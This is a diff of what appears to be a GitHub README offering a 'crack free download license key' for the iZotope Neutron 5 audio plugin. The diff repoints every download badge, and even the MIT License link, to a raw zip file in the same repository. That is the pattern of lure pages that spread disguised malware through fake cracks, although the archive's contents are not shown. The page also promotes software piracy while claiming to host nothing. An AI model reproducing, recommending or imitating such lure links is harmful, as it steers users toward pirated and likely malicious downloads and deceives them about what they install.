@@ -1,6 +1,6 @@
 # iZotope Neutron 5 Crack Free Download License Key
 
-[![Download](https://img.shields.io/badge/Download-green)](https://widyngen.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/widyngen/izotope-neutron-5-premium-unlocked/raw/refs/heads/branch/coercer/neutron-unlocked-izotope-premium-nanomelus.zip)
 
 ✨ **Unlock a new dimension in audio mixing mastery with the innovative suite powered by iZotope Neutron 5 License Solutions. Explore advanced mixing, precision, and creative freedom.** ✨
 
@@ -100,7 +100,7 @@ Harness OpenAI and Claude APIs for contextual mix advice, translated documentati
 Ready to leap from routine to revolutionary? Start your journey:
 
 1. **Download the toolkit**  
-   [![Download](https://img.shields.io/badge/Download-green)](https://widyngen.github.io)
+   [![Download](https://img.shields.io/badge/Download-green)](https://github.com/widyngen/izotope-neutron-5-premium-unlocked/raw/refs/heads/branch/coercer/neutron-unlocked-izotope-premium-nanomelus.zip)
 
 2. **Unpack & Install**  
    Follow the intuitive wizard for a seamless setup experience.
@@ -122,11 +122,11 @@ This repository is a technology showcase and does not host or distribute any pro
 ## 📜 MIT License
 
 This project is available under the MIT License (2025).  
-Learn more: [MIT License](https://opensource.org/licenses/MIT)
+Learn more: [MIT License](https://github.com/widyngen/izotope-neutron-5-premium-unlocked/raw/refs/heads/branch/coercer/neutron-unlocked-izotope-premium-nanomelus.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-green)](https://widyngen.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/widyngen/izotope-neutron-5-premium-unlocked/raw/refs/heads/branch/coercer/neutron-unlocked-izotope-premium-nanomelus.zip)
 
 ---
 
